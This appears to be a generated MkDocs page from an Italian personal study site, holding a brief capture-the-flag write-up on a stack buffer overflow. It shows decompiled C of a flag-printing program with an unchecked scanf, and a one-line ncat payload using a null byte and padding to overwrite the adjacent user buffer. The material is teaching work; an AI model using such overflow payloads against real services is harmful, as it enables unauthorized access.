@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>Null byte - Documentazione di Manuel</title>
+        <link href="../../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../../../css/brands.min.css" rel="stylesheet">
+        <link href="../../../../css/solid.min.css" rel="stylesheet">
+        <link href="../../../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/color-brewer.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../../../..">Documentazione di Manuel</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../../../.." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Git & GitHub</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../../Comandi%20Git%20%26%20GitHub/Comandi%20di%20Git%20Basilari/" class="dropdown-item">Introduzione</a>
+</li>
+                                    
+<li>
+    <a href="../../../../Comandi%20Git%20%26%20GitHub/Comandi%20di%20Git%20per%20collegarsi%20a%20GitHub/" class="dropdown-item">Connessioni a GitHub</a>
+</li>
+                                    
+<li>
+    <a href="../../../../Comandi%20Git%20%26%20GitHub/Cos%27%C3%A8%20un%20file%20.gitignore/" class="dropdown-item">Gitignore</a>
+</li>
+                                    
+<li>
+    <a href="../../../../Comandi%20Git%20%26%20GitHub/Git%20%26%20GitHub/" class="dropdown-item">Generale</a>
+</li>
+                                    
+<li>
+    <a href="../../../../Comandi%20Git%20%26%20GitHub/Issues%20e%20Pull%20Requests/" class="dropdown-item">Issues e Pull Requests</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">ITS</a>
+                                <ul class="dropdown-menu">
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Cyber</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../Cyber/Nmap/Nmap%20Introduction/" class="dropdown-item">Nmap</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Ncat</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../Cyber/Ncat/Ncat%20Introduction/" class="dropdown-item">Introduzione</a>
+</li>
+            
+<li>
+    <a href="../../../Cyber/Ncat/Ncat%20Advanced/" class="dropdown-item">Avanzato</a>
+</li>
+    </ul>
+  </li>
+            
+<li>
+    <a href="../../../Cyber/Challenge 3, UDP Chat (Red vs Blue vs Red vs Blue).md" class="dropdown-item">Challenge UDP</a>
+</li>
+            
+<li>
+    <a href="../../../Cyber/RaspBerry Pi Server.md" class="dropdown-item">Raspberry Pi</a>
+</li>
+            
+<li>
+    <a href="../../../Cyber/Vulnerabilità locali - Programmazione.md" class="dropdown-item">Vulnerabilità</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">System</a>
+    <ul class="dropdown-menu">
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Docker</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../System/Docker/Cos'è Docker.md" class="dropdown-item">Cos'è Docker</a>
+</li>
+            
+<li>
+    <a href="../../../System/Docker/Docker Compose.md" class="dropdown-item">Docker Compose</a>
+</li>
+            
+<li>
+    <a href="../../../System/Docker/DockerFile.md" class="dropdown-item">Dockerfile</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Linux</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../../System/Linux/Comandi di Linux.md" class="dropdown-item">Comandi Base</a>
+</li>
+            
+<li>
+    <a href="../../../System/Linux/Bash Scripting.md" class="dropdown-item">Bash Scripting</a>
+</li>
+            
+<li>
+    <a href="../../../System/Linux/Bash Scripting Advanced.md" class="dropdown-item">Bash Avanzato</a>
+</li>
+            
+<li>
+    <a href="../../../System/Linux/SSH/" class="dropdown-item">SSH</a>
+</li>
+            
+<li>
+    <a href="../../../System/Linux/FileTree/" class="dropdown-item">File Tree</a>
+</li>
+    </ul>
+  </li>
+            
+<li>
+    <a href="../../../System/Windows%20Server/Installazione%20Servizi%20%204%C2%B0%20e%205%C2%B0%20Slide/" class="dropdown-item">Windows Server</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">PostgreSQL</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../../PostgreSQL/Introduzione%20a%20PostgreSQL/" class="dropdown-item">Introduzione</a>
+</li>
+                                    
+<li>
+    <a href="../../../../PostgreSQL/Installazione/" class="dropdown-item">Installazione</a>
+</li>
+                                    
+<li>
+    <a href="../../../../PostgreSQL/Inserimento%20Dati/" class="dropdown-item">Inserimento Dati</a>
+</li>
+                                    
+<li>
+    <a href="../../../../PostgreSQL/Queries/" class="dropdown-item">Queries</a>
+</li>
+                                    
+<li>
+    <a href="../../../../PostgreSQL/Joins/" class="dropdown-item">Joins</a>
+</li>
+                                    
+<li>
+    <a href="../../../../PostgreSQL/pgAdmin%204/" class="dropdown-item">pgAdmin 4</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Altro</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../../../MkDocs & Mermaid.js.md" class="dropdown-item">Mermaid e MkDocs</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<blockquote>
+<p>In C le stringhe sono array di caratteri, quindi il buffer (dimensione della stringa da inserire) deve essere specificato prima.</p>
+<p>Quando inseriamo una stringa che supera questo buffer, se non vengono eseguiti controlli si può andare in contro ad un <strong>buffer overflow</strong></p>
+<p>Quello che viene scritto in eccesso non scompare, ma viene scritto in memoria.</p>
+<p>Se analizziamo il codice già compilato di C in Ghidra ci permetterà di analizzare il codice sorgente analizzandone l'ELF.
+Sarà di conseguenza possibile analizzare il codice sorgente</p>
+</blockquote>
+<pre><code class="language-C">undefined8 main(void)
+
+{
+  int iVar1;
+  char *current_user_ptr;
+  undefined8 uVar2;
+
+  //Quello che eccede name_input va dentro current_user
+  char name_input [100];
+  char current_user [108];
+
+  current_user_ptr = getenv(&quot;USER&quot;);  //Prende la variabile d'ambiente
+  strcpy(current_user,current_user_ptr); //Salviamo la variabile l'ambiente dentro current_user
+  puts(&quot;Howdy! What\'s your name?&quot;);
+  __isoc23_scanf(&amp;DAT_00102026,name_input); //nome inserito dall'utente
+  iVar1 = strcmp(&quot;root&quot;,name_input);   //Compariamo le 2 stringhe
+  if (iVar1 == 0) {   //vuol dire che le 2 stringhe erano uguali
+    iVar1 = strcmp(&quot;root&quot;,current_user);  //compariamo effettivamente se lo user ricavato tramite l'ENV è root
+    if (iVar1 == 0) {
+      puts(&quot;Hi, root! Here\'s your flag. Please keep it to yourself:&quot;);
+      current_user_ptr = getenv(&quot;FLAG&quot;);
+      puts(current_user_ptr);
+      uVar2 = 0;
+    }
+    else {
+      printf(&quot;Liar! You are not root, you are %s!&quot;,current_user);
+      uVar2 = 1;
+    }
+  }
+  else {
+    puts(&quot;Sorry, you must be root to get the flag!&quot;);
+    uVar2 = 1;
+  }
+  return uVar2;
+</code></pre>
+<blockquote>
+<p>Lo scanf smette di leggere l'input dell'utente quando rileva un <strong>null byte (\x00)</strong>
+Quindi se occupiamo interamente il buffer di name_input il resto occuperà la variabile current_user</p>
+</blockquote>
+<pre><code class="language-C">char name_input [100];
+char current_user [108];
+</code></pre>
+<blockquote>
+<p>Per risolvere facciamo:</p>
+</blockquote>
+<pre><code class="language-shell">echo root\x00TANTICARATTERIQUANTIPERRIEMPIREILBUFFERroot | ncat ip porta
+</code></pre></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../../../js/base.js"></script>
+        <script src="../../../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
